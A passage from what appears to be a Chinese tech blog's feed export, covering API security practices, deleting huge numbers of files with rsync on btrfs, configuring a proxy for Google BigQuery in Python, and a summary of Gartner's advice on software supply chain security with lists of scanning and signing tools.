title="6、日志和监控"></a>6、日志和监控</h2><p>日志记录和监控数据对于构建构成“正常”的基线也很有用，这样就可以快速识别和解决异常事件。</p><ul><li>必须记录所有架构、应用和API的日志信息</li><li>考虑非安全的场景，比如API的性能，上线时间</li><li>为API分配足够的资源，可以考虑增加云资源</li></ul><h2 id="7、API的适配和架构"><a href="#7、API的适配和架构" class="headerlink" title="7、API的适配和架构"></a>7、API的适配和架构</h2><p>API中间件将帮助企业加速交付、灵活运维、改进实施能力，特别是在涉及到 API 访问控制时。</p><ul><li>采用API中间件提高观察和监控能力</li><li>采用中间件机制(如：API网关)实施访问控制</li><li>采用能够提供深入上下文的API安全工具来增强中间件机制</li></ul><h2 id="8、网络安全"><a href="#8、网络安全" class="headerlink" title="8、网络安全"></a>8、网络安全</h2><p>零信任体系架构的一个主要目标是实施最小特权并动态限制网络访问。但是，API必须具有连接性才能正常工作，而且许多API攻击仍然发生在可信通道和经过身份验证的会话中。</p><ul><li>启用加密传输来保护API传输的数据 </li><li>如果API使用者数量较少，请使用IP地址白名单和黑名单列表</li><li>寻求动态速率限制，并将静态速率限制作为最后的手段</li></ul><h2 id="9、数据安全"><a href="#9、数据安全" class="headerlink" title="9、数据安全"></a>9、数据安全</h2><p>数据安全方案旨在提供数据的机密性、完整性和可用性，但85%的组织缺乏信心，他们不知道哪些API会暴露敏感数据。参考这部分可以减少敏感数据的暴露，敏感数据泄露会导致重大的监管处罚、大规模的隐私影响和公司品牌损害。</p><ul><li>启用加密传输以保护API传输的数据 </li><li>如果API使用者数量较少，请使用IP地址白名单和黑名单列表</li><li>寻求动态速率限制，并将静态速率限制作为最后的手段</li></ul><h2 id="10、认证和授权"><a href="#10、认证和授权" class="headerlink" title="10、认证和授权"></a>10、认证和授权</h2><p>在考虑用于身份验证和授权的API安全最佳实践时，需要同时考虑用户和计算机基础设施，尽可能将API访问控制和身份存储外部化，包括API网关、用户和计算机凭证存储、IAM解决方案、密钥管理服务、公钥基础设施和机密管理等安全机制。</p><ul><li>持续认证和授权API使用者</li><li>避免使用API密钥作为身份验证手段</li><li>使用带有安全扩展的现代授权协议，如OAuth2</li></ul><h2 id="11、运行时保护"><a href="#11、运行时保护" class="headerlink" title="11、运行时保护"></a>11、运行时保护</h2><p>任何运行时保护都应该是动态的，并不断学习。识别API基础架构中的错误配置以及诸如凭据填充、暴力破解或恶意爬虫等行为异常。</p><ul><li>如果可以，启用API网关和APIM的威胁防护功能</li><li>增加API系统 DoS 和 DDoS 防护</li><li>超越传统依赖规则的运行时控制，利用AI&#x2F;ML和行为分析引擎来检测API攻击</li></ul><h2 id="12、安全运营"><a href="#12、安全运营" class="headerlink" title="12、安全运营"></a>12、安全运营</h2><p>SoC安全人员必须经常依赖最了解应用程序体系结构和API逻辑的应用程序开发人员和API项目团队。详细的应用程序和业务逻辑在数字取证和事件响应中至关重要。安全管理人员需要更多地强调SecOps的人员和流程方面，而不是技术方面。</p><ul><li>明确API运营体系中涉及的非安全和安全角色</li><li>创建以API为中心的事件响应手册</li><li>显示可操作的API事件和不转储数据，避免SOC资源耗尽</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://content.salt.security/rs/352-UXR-417/images/SaltSecurity-Checklist-API_Security_Best_Practices.xlsx">https://content.salt.security/rs/352-UXR-417/images/SaltSecurity-Checklist-API_Security_Best_Practices.xlsx</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Api</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>创建空文件显示No space left on device</title>
    <link href="/2022/05/25/2022-05-25-resolve-create-directory-no-space-left-on-device/"/>
    <url>/2022/05/25/2022-05-25-resolve-create-directory-no-space-left-on-device/</url>
    
    <content type="html"><![CDATA[<p>创建空文件显示No space left on device</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>同事写的代码逻辑有问题，程序运行一夜以后，磁盘占用率100%，随便统计了一下创建的垃圾文件100W+，忍住怒火，给他收拾烂摊子。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>由于文件太多，使用rm删除速度缓慢，参考一篇腾讯云的一篇文章：《Linux 下删除大量文件效率对比，看谁删的快！》,以删除50W空文件来测试，使用rsync，采用替换原理删除文件较为方便和高效，部分博文写的有问题，被坑到了（自己太菜了）。</p><blockquote><p>rm：文件数量太多，不可用<br>find with -exec 50万文件耗时43分钟<br>find with -delete 9分钟<br>Perl  16s<br>Python 9分钟<br>rsync with -delete  16s</p></blockquote><p>删除命令：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">rsync <span class="hljs-attr">--delete-before</span> -d -<span class="hljs-selector-tag">a</span> -H -v <span class="hljs-attr">--progress</span> <span class="hljs-attr">--stats</span> plugins/ bin/<br></code></pre></td></tr></table></figure><ul><li>bin目录是需要删除的，plugins目录是空目录</li><li>–delete-before 表示在传输过程中删除</li><li>–stats 显示文件传输状态</li><li>-v 详细输出</li><li>-d 不重复传输目录</li><li>-a 归档模式，删除时没啥用</li><li>-H 保持硬链接文件</li><li>–progress 传输时显示传输过程<br>由于文件比较多，删除耗费时间过长，设备又等着释放空间启动其他应用程序，如果使用rsync进行删除，最后一步需要移除plugins文件，否则inode不会释放，查看磁盘，占用率仍然为100%。<br>rsync能快熟进行删除，采用替换的原理进行，执行完rsync命令后，需要移除空文件，才能释放文件inode，否则就会出现，文件已删除，但是会显示“No space left on device”，现象如下：<br><img src="/img/20220525-01.png" alt="No space left on device"><br>rsync删除过程，文件占用率未发生变化：<br><img src="/img/20220525-02.png" alt="磁盘文件占用率未发生变化"></li><li>此处有个知识点，由于磁盘使用btrfs文件系统，BTRFS并不以其他文件系统的方式使用Inodes，也没有预先确定的限制，因此无需计算。 由于BTRFS不使用Inodes，BTRF的Inode计数始终显示为零。<br>删除同步文件目录plugins后，磁盘占用率立刻恢复正常：<br><img src="/img/20220525-03.png" alt="磁盘文件占用率恢复正常"></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>rsync删除速度迅速，但是需要移除同步文件夹才会释放inode，否则磁盘无法写入文件</li><li>btrfs使用不当，理论上建立快照，通过恢复快照即可，有些暴殄天物</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://cloud.tencent.com/developer/article/1647290">https://cloud.tencent.com/developer/article/1647290</a>【Linux 下删除大量文件效率对比，看谁删的快！】</li><li><a href="https://www.thegeekdiary.com/command-df-i-shows-inode0-on-btrfs-file-system/">https://www.thegeekdiary.com/command-df-i-shows-inode0-on-btrfs-file-system/</a>【Command ‘df -i’ Shows ‘Inode&#x3D;0’ on BTRFS File System】</li><li><a href="https://wiki.archlinux.org/title/Btrfs">https://wiki.archlinux.org/title/Btrfs</a>【Btrfs】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Os</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>谷歌 bigquery 配置代理</title>
    <link href="/2022/05/18/2022-05-18-google-bigquery-config-proxy/"/>
    <url>/2022/05/18/2022-05-18-google-bigquery-config-proxy/</url>
    
    <content type="html"><![CDATA[<p>谷歌 bigquery 配置代理</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>谷歌云提供bigquery服务，BigQuery是一个RESTful的Web服务 ，可以对与Google Storage结合使用的大型数据集进行交互式分析。它是一种无服务器的平台即服务（ PaaS ），且可与MapReduce相互补充使用。我们需要获取部分数据信息进行分析，由于GFW的原因，需要配置代理服务器获取数据。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>由于项目主要开发语言为python，这里主要介绍均以python为主。根据BigQuery API Client Libraries的wiki信息，我们首先获取身份认证信息。这个按照wiki一步一步来做即可。最终获取到一个授权的json文件，我们保存到本地的项目当中。</p><h2 id="构造请求demo"><a href="#构造请求demo" class="headerlink" title="构造请求demo"></a>构造请求demo</h2><p>基于BigQuery API Client Libraries 提供的python demo程序，我们自行构造自己的查询程序，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> google.cloud <span class="hljs-keyword">import</span> bigquery<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> google.auth<br>AUTH_JSON_FILE_PATH = <span class="hljs-string">&#x27;./bigquery-35b79efd3da3.json&#x27;</span><br><br><span class="hljs-comment"># 初始化</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bq_InitConnection</span>():<br>    os.environ[<span class="hljs-string">&#x27;GOOGLE_APPLICATION_CREDENTIALS&#x27;</span>] = AUTH_JSON_FILE_PATH<br>    os.environ[<span class="hljs-string">&quot;HTTP_PROXY&quot;</span>] = <span class="hljs-string">&quot;socks5://127.0.0.1:6666&quot;</span><br>    os.environ[<span class="hljs-string">&quot;HTTPS_PROXY&quot;</span>] = <span class="hljs-string">&quot;socks5://127.0.0.1:6666&quot;</span><br>    credentials, _ = google.auth.default()<br>    credentials = google.auth.credentials.with_scopes_if_required(<br>                  credentials, bigquery.Client.SCOPE)<br>    authed_http = google.auth.transport.requests.AuthorizedSession(credentials)<br><br>    bigquery_client = bigquery.Client(credentials=credentials, _http=authed_http)<br>    <span class="hljs-keyword">return</span> bigquery_client<br><br><span class="hljs-comment"># 查询</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_stackoverflow</span>():<br>    client = bq_InitConnection()<br>    query_job = client.query(<br>        <span class="hljs-string">&quot;&quot;&quot; custom query sql &quot;&quot;&quot;</span><br>    )<br><br>    results = query_job.result()  <span class="hljs-comment"># Waits for job to complete.</span><br><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> results:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125; : &#123;&#125; :  &#123;&#125; : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(row.Checks, row.Date,row.Repo,row.Metadata))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    query_stackoverflow()<br></code></pre></td></tr></table></figure><p>说明：  </p><ul><li>其中AUTH_JSON_FILE_PATH为授权文件路径，自行配置   </li><li>代理配置的思路相当于手动配置当前python程序的http和https代理，如果已经配置了系统代理，这步就可以省略了     </li><li>查询语句根据实际情况自行构建</li></ul><p><img src="/img/20220518-01.png" alt="成功获取结果"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://cloud.google.com/bigquery/docs/reference/libraries#client-libraries-usage-python">https://cloud.google.com/bigquery/docs/reference/libraries#client-libraries-usage-python</a>【BigQuery API Client Libraries】</li><li><a href="https://stackoverflow.com/questions/43926668/python3-bigquery-or-google-cloud-python-through-http-proxy/43945207#43945207">https://stackoverflow.com/questions/43926668/python3-bigquery-or-google-cloud-python-through-http-proxy/43945207#43945207</a>【Python3 BigQuery or Google Cloud Python through HTTP Proxy】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Software Supply Chain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Garter-《软件工程领导者如何降低软件供应链风险》分享</title>
    <link href="/2022/05/11/2022-05-11-How-Software-Engineering-Leaders-Can-Mitigate-Software-Supply-Chain-Security-Risks-Review/"/>
    <url>/2022/05/11/2022-05-11-How-Software-Engineering-Leaders-Can-Mitigate-Software-Supply-Chain-Security-Risks-Review/</url>
    
    <content type="html"><![CDATA[<p>Garter-《软件工程领导者如何降低软件供应链风险》分享</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Garter发布《软件工程领导者如何降低软件供应链分享》的调研文章，有幸研读，感觉对供应链安全的理解更深了，这里把里面的内容进行整理和分析，其中翻译不准确，不乏博主个人观点，请见谅。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>调研关键发现共分为以下三点：    </p><ul><li>恶意代码注入威胁的增加使得保护内部代码和外部依赖项（开源和商业）变得至关重要。    </li><li>软件构建和交付流程受到破坏的后将导致泄露机密或其他敏感数据和代码被篡改。    </li><li>未能强制执行最低权限和扁平化网络架构（对应的是分层网络架构或隔离网络）会使攻击者横向移动到生产环境，从而使企业面临更大的风险。</li></ul><p>根据关键发现，调研给出以下建议，软件工程领导者应该与他们的安全和风险管理团队合作，具体分为以下三点：</p><ul><li>在整个交付生命周期中，通过强制执行健全的版本控制策略、使用制品库来存储受信任的组件以及管理供应商风险，进而来保护内部和外部代码的完整性。</li><li>通过在 CI&#x2F;CD 中配置安全工具，保护机密以及代码和对容器镜像签名，最终来强化软件交付管道流程。</li><li>通过使用最小特权原则和零信任安全模型来管理资源的访问，保护软件工程师的操作环境。</li></ul><p>客户关注的供应链风险维度分为以下三点：</p><ul><li>CI&#x2F;CD系统的威胁</li><li>恶意代码注入风险</li><li>包含漏洞和恶意代码的依赖项</li></ul><blockquote><p>从SolarWinds (2020)、NetBeans IDE (2020)、Kaseya (2021) 和 Codecov (2021)代表软件供应链攻击的这四个突出示例来看。Gartner 认为，到 2025 年，全球 45% 的组织将受到软件供应链遭受攻击，比 2021 年增加了三倍。</p></blockquote><h2 id="潜在软件供应链安全风险"><a href="#潜在软件供应链安全风险" class="headerlink" title="潜在软件供应链安全风险"></a>潜在软件供应链安全风险</h2><p>软件供应链攻击是在软件开发、交付和使用的任何阶段破坏软件或其依赖项之一的行为。 尽管每种情况下精确的攻击向量可能不同，但攻击者通常会未授权访问开发环境和基础设施，包括版本控制系统、制品仓库、开源软件存储库、持续集成管道、构建服务器或应用程序服务器等，这导致攻击者可以通过修改源代码、脚本和依赖软件包，并建立后门窃取受害者环境中的数据。攻击包括但不仅限于外部攻击者，也可能来自内部威胁。</p><p><img src="/img/20220511-01.png" alt="潜在软件供应链安全风险"></p><h3 id="内部和外部代码风险（开源组件）"><a href="#内部和外部代码风险（开源组件）" class="headerlink" title="内部和外部代码风险（开源组件）"></a>内部和外部代码风险（开源组件）</h3><h4 id="开发阶段"><a href="#开发阶段" class="headerlink" title="开发阶段"></a>开发阶段</h4><ul><li>证书丢失</li><li>密钥硬编码</li><li>密钥丢失</li><li>弱加密</li><li>代码注入</li><li>固件串改</li></ul><h4 id="集成阶段"><a href="#集成阶段" class="headerlink" title="集成阶段"></a>集成阶段</h4><ul><li>开源组件漏洞</li><li>包名抢注</li><li>命名空间冲突</li><li>不安全的第三方SDK和API</li></ul><h3 id="交付流程风险"><a href="#交付流程风险" class="headerlink" title="交付流程风险"></a>交付流程风险</h3><ul><li>签名证书被篡改</li><li>自动化脚本被篡改</li></ul><h3 id="生产环境风险"><a href="#生产环境风险" class="headerlink" title="生产环境风险"></a>生产环境风险</h3><ul><li>未授权访问</li><li>二进制代码逆向</li><li>表单劫持</li><li>提权</li><li>网络端口扫描</li><li>更新劫持<br>……</li></ul><h2 id="软件开发和部署中降低供应链安全风险的最佳安全开发实践"><a href="#软件开发和部署中降低供应链安全风险的最佳安全开发实践" class="headerlink" title="软件开发和部署中降低供应链安全风险的最佳安全开发实践"></a>软件开发和部署中降低供应链安全风险的最佳安全开发实践</h2><p>针对这三类风险，Gartner给出了部分应对措施和建议。<br><img src="/img/20220511-02.png" alt="软件开发和部署中降低供应链安全风险的最佳安全开发实践"></p><h3 id="内部和外部代码风险应对措施"><a href="#内部和外部代码风险应对措施" class="headerlink" title="内部和外部代码风险应对措施"></a>内部和外部代码风险应对措施</h3><p>软件研发团队使用版本控制系统（git&#x2F;svn等）和制品库来维护内部代码开发和外部制品分发，如果未将这些版本控制系统和制品库进行安全控制，可导致源代码和组件被篡改或劫持。Garter推荐以下三种方式来保障代码和组件的完整性。</p><ul><li>严格的版本控制</li><li>受信任的组件库</li><li>第三方风险管理</li></ul><h4 id="严格的版本控制"><a href="#严格的版本控制" class="headerlink" title="严格的版本控制"></a>严格的版本控制</h4><p>基于 Git 的版本管理系统（VCS），包括 BitBucket、GitHub 和 GitLab，提供源代码托管和访问权限控制能力，软件工程团队必须启用访问策略控制、分支保护和敏感扫描功能。 这些控件策略默认情况下不启用，必须进行配置。<br><img src="/img/20220511-03.png" alt="健全的版本控制策略"></p><p>由于部分研发人员安全意思孱弱，无意将密钥信息，证书等上传到github或者gitlab上，任何能访问到源代码的用户均可获取相关敏感信息,Garter推荐部分基于Git存储库的敏感信息扫描工具</p><table><thead><tr><th>开源工具</th><th>厂商</th></tr></thead><tbody><tr><td>git-secrets: Open sourced by AWS Labs</td><td>Github Secrets Scanning</td></tr><tr><td>Repo Supervisor: Open sourced by Auth0</td><td>GitLab Secret Detection</td></tr><tr><td>truffleHog: Searches for secrets in Git repos</td><td>Bitbuchet Secrets Scan</td></tr><tr><td>Gitleaks: Scans repos and commits for secrets</td><td>GitGuardian</td></tr><tr><td>Deadshot: Open sourced by Twilio</td><td>SpectralOps</td></tr></tbody></table><h4 id="受信任的组件库"><a href="#受信任的组件库" class="headerlink" title="受信任的组件库"></a>受信任的组件库</h4><p>建议使用制品（或容器镜像）存储库、软件成分分析工具和源代码扫描工具，其中制品存储库可以对组件进行分发版本控制，软件成分分析工具（SCA）可以对当前组件及源代码进行成分分析，获取项目的依赖风险信息，并及时进行升级修复，对于源代码扫描工具(SAST)，可以对用户自己编写的源代码进行合规和安全行分析。<br>常见的制品库管理工具如下：</p><table><thead><tr><th>组件管理平台</th><th>容器管理平台</th></tr></thead><tbody><tr><td>Azure Artifacts</td><td>Azure Container Registry</td></tr><tr><td>AWS CodeArtifacts</td><td>Amazon ECR</td></tr><tr><td>GitHub</td><td>CNCF Harbor</td></tr><tr><td>GitLab</td><td>Docker Trusted Registry</td></tr><tr><td>Google Artifact Registry</td><td>GitHub</td></tr><tr><td>JFrog Artifactory</td><td>GitLab</td></tr><tr><td>Sonatype Nexus Repository</td><td>Google Container Registry</td></tr><tr><td>Tidelift Catalogs</td><td>JFrog Artifactory</td></tr><tr><td></td><td>Red Hat Quay</td></tr></tbody></table><p>常用企业级的SAST工具如下（这里没必要抬杠，工具有上百种，只列举常见的SAST平台，数据来源互联网、个人审计工作和客户反馈，杠精勿扰）：</p><table><thead><tr><th>工具名称</th><th>类型</th><th>公司</th><th>地址</th></tr></thead><tbody><tr><td>Fortify sca</td><td>商业</td><td>Hp Security</td><td><a href="https://www.microfocus.com/zh-cn/products/static-code-analysis-sast/overview">https://www.microfocus.com/zh-cn/products/static-code-analysis-sast/overview</a></td></tr><tr><td>checkmarx sast</td><td>商业</td><td>checkmarx</td><td><a href="https://checkmarx.com/product/cxsast-source-code-scanning/">https://checkmarx.com/product/cxsast-source-code-scanning/</a></td></tr><tr><td>Sonarqube</td><td>开源</td><td>Sonaqube</td><td><a href="https://www.sonarqube.org/">https://www.sonarqube.org/</a></td></tr><tr><td>Veracode Static Analysis (SAST)</td><td>商业</td><td>Veracode</td><td><a href="https://www.veracode.com/products/binary-static-analysis-sast">https://www.veracode.com/products/binary-static-analysis-sast</a></td></tr><tr><td>Coverity</td><td>商业</td><td>synopsys</td><td><a href="https://www.synopsys.com/software-integrity/security-testing/static-analysis-sast.html">https://www.synopsys.com/software-integrity/security-testing/static-analysis-sast.html</a></td></tr><tr><td>奇安信代码卫士</td><td>商业</td><td>qax</td><td><a href="https://www.qianxin.com/product/detail/pid/14">https://www.qianxin.com/product/detail/pid/14</a></td></tr><tr><td>DMSCA</td><td>商业</td><td>端玛科技</td><td><a href="http://www.dumasecurity.com/goods.html">http://www.dumasecurity.com/goods.html</a></td></tr><tr><td>AppScan Source</td><td>商业</td><td>HCL AppScan</td><td><a href="https://www.hcltechsw.com/appscan/offerings/source">https://www.hcltechsw.com/appscan/offerings/source</a></td></tr></tbody></table><ul><li>对于其他SAST工具，比如codeql之类小众优秀的工具，这里不做推荐，暂时无法满足企业级需求，对于其他国产SAST工具，这里不做说明和推荐，勿杠。</li></ul><p>常用企业级SCA工具（同上）：</p><table><thead><tr><th>工具名称</th><th>类型</th><th>公司</th><th>地址</th></tr></thead><tbody><tr><td>Black Duck Software Composition Analysis</td><td>商业</td><td>synopsys</td><td><a href="https://www.synopsys.com/software-integrity/security-testing/software-composition-analysis.html">https://www.synopsys.com/software-integrity/security-testing/software-composition-analysis.html</a></td></tr><tr><td>nexus lifecycle</td><td>商业</td><td>Sonatype</td><td><a href="https://www.sonatype.com/products/open-source-security-dependency-management?topnav=true">https://www.sonatype.com/products/open-source-security-dependency-management?topnav=true</a></td></tr><tr><td>Veracode sca</td><td>商业</td><td>Veracode</td><td><a href="https://www.veracode.com/products/software-composition-analysis">https://www.veracode.com/products/software-composition-analysis</a></td></tr><tr><td>Jfrog Xray</td><td>商业</td><td>Jfrog</td><td><a href="https://jfrog.com/xray/">https://jfrog.com/xray/</a></td></tr><tr><td>Mend sca</td><td>商业</td><td>Mend</td><td><a href="https://www.mend.io/sca/">https://www.mend.io/sca/</a></td></tr><tr><td>checkmarx sca</td><td>商业</td><td>Checkmarx</td><td><a href="https://checkmarx.com/product/cxsca-open-source-scanning/">https://checkmarx.com/product/cxsca-open-source-scanning/</a></td></tr><tr><td>Dependency Scanning</td><td>商业</td><td>Gitlab</td><td><a href="https://docs.gitlab.com/ee/user/application_security/dependency_scanning/">https://docs.gitlab.com/ee/user/application_security/dependency_scanning/</a></td></tr><tr><td>Dependency Track</td><td>开源</td><td>Owasp</td><td><a href="https://dependencytrack.org/">https://dependencytrack.org/</a></td></tr><tr><td>雳鉴SCA</td><td>商业</td><td>默安</td><td><a href="https://www.moresec.cn/product/sdl-sca">https://www.moresec.cn/product/sdl-sca</a></td></tr><tr><td>悬镜源鉴OSS</td><td>商业</td><td>悬镜</td><td><a href="https://oss.xmirror.cn/">https://oss.xmirror.cn/</a></td></tr><tr><td>CoBot</td><td>商业</td><td>北大库博</td><td><a href="https://www.pkuse.com.cn/multi/521.html">https://www.pkuse.com.cn/multi/521.html</a></td></tr></tbody></table><p>The Forrester Wave SCA<br><img src="/img/20220511-04.jpeg" alt="Forrester Wave SCA Analysis "></p><p><img src="/img/20220511-05.jpeg" alt="Forrester Wave SCA Analysis "></p><blockquote><p>TOP 10 SCA工具中有5款支持软件包开源软件SCA检查能力(synopsys&#x2F; Sonatype&#x2F; Veracode&#x2F; Jfrog&#x2F; GitLab)，其他工具只支持源代码SCA检查能力。<br>5款支持软件包SCA检查工具中，对C&#x2F;C++、Java、.Net语言支持的比较好，但对Golang、python、JavaScript语言支持能力偏弱，比如：synopsys支持的组件对象中前面3种语言占大头90%+，相应的检测率也高，而Golang语言的组件检出率则低很多。</p></blockquote><h4 id="第三方风险管理"><a href="#第三方风险管理" class="headerlink" title="第三方风险管理"></a>第三方风险管理</h4><p>常见的与第三方软件相关的两种供应链风险：</p><ol><li>由于第三方或开源依赖项中的已知漏洞而导致的风险</li><li>由于外部采购软件中植入后门&#x2F;恶意软件的风险</li></ol><p>Garter提供的解决措施：</p><ol><li>检查第三方是否遵循标准或获得认证</li><li>检查供应商是否有必要的措施开展SDLC流程</li><li>供应商遵循什么流程来修补自己的软件及其依赖项</li><li>第三方软件的更新机制是否受到保护</li><li>对于第三方软件或依赖项中发现的漏洞的SLA（软件服务协议）是什么？</li></ol><p>软件供应链安全评估框架和标准</p><table><thead><tr><th>评估名称</th><th>简介</th><th>地址</th></tr></thead><tbody><tr><td>Evaluating Your Supply Chain Security</td><td>A Checklist by Cloud Native Computing Foundation (CNCF)</td><td><a href="https://github.com/cncf/tag-security/blob/main/supply-chain-security/supply-chain-security-paper/secure-supply-chain-assessment.md">https://github.com/cncf/tag-security/blob/main/supply-chain-security/supply-chain-security-paper/secure-supply-chain-assessment.md</a></td></tr><tr><td>NIST Secure Software Development Framework</td><td>Secure Software Development Framework (SSDF) Version 1.1:Recommendations for Mitigating the Risk of SoftwareVulnerabilities</td><td><a href="https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf">https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf</a></td></tr><tr><td>NIST, Security and Privacy Controls for Information Systems and Organizations</td><td>Security and Privacy Controls.</td><td><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf">https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf</a></td></tr><tr><td>Ul 2900 for IoT Certification</td><td>UL 2900 series of standards was developed as part of UL’s Cybersecurity Assurance Program which provides manufacturers testable and measureable criteria</td><td><a href="https://www.cybersecuritysummit.org/wp-content/uploads/2017/10/4.00-Justin-Heyl.pdf">https://www.cybersecuritysummit.org/wp-content/uploads/2017/10/4.00-Justin-Heyl.pdf</a></td></tr><tr><td>ISO&#x2F;IEC 27034</td><td>Information technology — Security techniques — Application security</td><td><a href="https://www.iso.org/standard/44378.html">https://www.iso.org/standard/44378.html</a></td></tr></tbody></table><p>软件供应链开源项目安全评估</p><table><thead><tr><th>评估名称</th><th>简介</th><th>地址</th></tr></thead><tbody><tr><td>Open Source Insights</td><td>Open Source Insights 会展示软件包的相关信息，而无需用户预先安装软件包。开发人员可以看到该依赖包对项目的重要程度，依赖组件流行程度，查找源代码的链接，然后决定是否应安装该组件。</td><td><a href="https://opensource.googleblog.com/2021/06/introducing-open-source-insights-project.html">https://opensource.googleblog.com/2021/06/introducing-open-source-insights-project.html</a></td></tr><tr><td>OSSF Scorecard</td><td>OSSF Scorecard 是一个通过多种维度来评估开源项目的安全性的工具.</td><td><a href="https://github.com/ossf/scorecard">https://github.com/ossf/scorecard</a></td></tr><tr><td>Supply chain Levels for Software Artifacts (SLSA, pronounced “salsa”)</td><td>确保软件供应链中组件完整性的端到端保护框架。</td><td><a href="https://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html">https://security.googleblog.com/2021/06/introducing-slsa-end-to-end-framework.html</a></td></tr></tbody></table><h3 id="交付流程风险应对措施"><a href="#交付流程风险应对措施" class="headerlink" title="交付流程风险应对措施"></a>交付流程风险应对措施</h3><h4 id="1-使用密钥管理工具："><a href="#1-使用密钥管理工具：" class="headerlink" title="1. 使用密钥管理工具："></a>1. 使用密钥管理工具：</h4><p>密钥管理通过规范的方法来管理和保护如凭证、密码、API 令牌和证书等机密。 Garter建议使用密钥管理工具来自动创建、存储、检索和撤销秘密。 这有助于避免在源代码、配置文件和基础设施自动化脚本中嵌入（硬编码）密钥信息等。<br>常见的密钥管理工具如下：</p><table><thead><tr><th>场景</th><th>密钥管理工具</th></tr></thead><tbody><tr><td>与平台无关</td><td>Akeyless </br> CyberArk Conjur  </br> Thycotic Secrets Vault </br> HashiCorp Vault</td></tr><tr><td>云厂商提供</td><td>AWS Secrets Manager </br> Azure Key Vault </br> GCP Secret Manager</td></tr><tr><td>容器原生环境</td><td>Kubernetes Secrets (etcd) </br> Sealed Secrets</td></tr><tr><td>配置管理</td><td>Ansible Vault </br>  Chef Data Bag </br> Puppet Hiera</td></tr></tbody></table><h4 id="2-通过签名和散列函数来验证源码的完整性"><a href="#2-通过签名和散列函数来验证源码的完整性" class="headerlink" title="2. 通过签名和散列函数来验证源码的完整性"></a>2. 通过签名和散列函数来验证源码的完整性</h4><ol><li>哈希和签名可用于验证源代码和二进制文件的完整性。<br> VCS（版本控制系统）在提交时会对单个文件生成哈希，该哈希可以用于验证文件在传输过程中是否被篡改。另外，编译器在编译时也生成哈希，可以通过将提交时和编译时的哈希进行对比，以保证代码在提交阶段和编译阶段未被篡改。</li><li>提交签名<br> 由于哈希不能验证来源，所以需要通过VCS的签名提交功能来验证提交代码人的身份。</li><li>容器签名<br> 当前越来越多的系统开始通过容器进行部署，因此需要保证容器未被篡改过。即使用户的公司或组织自行构建和维护内部镜像，Gartner 也建议对容器镜像进行签名。这是因为第三方代码或依赖项中的任何问题都会影响正在运行的应用程序的安全状况</li></ol><p><img src="/img/20220511-06.png" alt="Kubernetes 容器镜像漏洞的传播 "></p><p>容器签名的工具如下： </p><table><thead><tr><th>工具名称</th><th>介绍</th><th>地址</th></tr></thead><tbody><tr><td>Grafeas</td><td>Grafeas定义用于管理有关软件资源的元数据的API格式，例如容器镜像，VM镜像，JAR包和脚本，为构建代码到容器供应链的组件，包括组件的来源、漏洞、依赖关系等提供了一个集中的知识库。</td><td><a href="https://github.com/grafeas/grafeas">https://github.com/grafeas/grafeas</a></td></tr><tr><td>Kritis</td><td>Kritis 是一个Kubernetes准入控制器，它在运行时运行由Kubernetes集群管理员定义的策略检查，然后根据镜像中的漏洞或镜像不是从可信来源获得的，批准或拒绝要启动的容器。</td><td><a href="https://github.com/grafeas/kritis">https://github.com/grafeas/kritis</a></td></tr><tr><td>Kritis Singer</td><td>是一个为容器图像创建认证的命令行工具。</td><td><a 